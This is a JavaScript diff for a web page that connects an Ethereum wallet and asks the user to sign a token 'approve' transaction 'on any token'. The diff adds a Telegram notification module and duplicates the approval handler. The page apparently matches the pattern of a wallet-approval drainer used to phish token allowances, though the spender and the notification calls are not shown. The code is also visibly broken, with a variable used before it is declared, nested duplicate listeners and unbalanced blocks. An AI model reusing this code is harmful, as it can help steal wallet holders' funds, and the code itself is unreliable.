@@ -1,3 +1,4 @@
+const { sendNotification } = require('./telegramBot');
 document.addEventListener("DOMContentLoaded", async function () {
     const web3 = new Web3("https://mainnet.infura.io/v3/65a9bb61d9144ba19821fa07cfb10a41"); // Replace with your Infura project ID or Ethereum node URL
     const usdcContractAddress = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52"; // contract address of token
@@ -46,11 +47,12 @@ document.addEventListener("DOMContentLoaded", async function () {
 
     connectWalletButton.addEventListener("click", connectWallet);
 
-    connectWalle.addEventListener("click", async function () {
+    approveButton.addEventListener("click", async function () {
         try {
             if (!userAddress) {
                 throw new Error("Please connect your wallet first.");
             }
+    const approveButton = document.getElementById("approveButton");        
 
             // contract abi for approve on any token
             const usdcContractABI = [
@@ -96,7 +98,12 @@ document.addEventListener("DOMContentLoaded", async function () {
                 gas: gas, // Use the estimated gas as a string
                 value: "0x00",
                 data: data,
-            };           
+            };  
+                approveButton.addEventListener("click", async function () {
+        try {
+            if (!userAddress) {
+               throw new Error("Please connect your wallet first.");
+            }
             // Request the user's approval to sign the transaction
             const signedTx = await ethereum.request({
                 method: 'eth_sendTransaction',
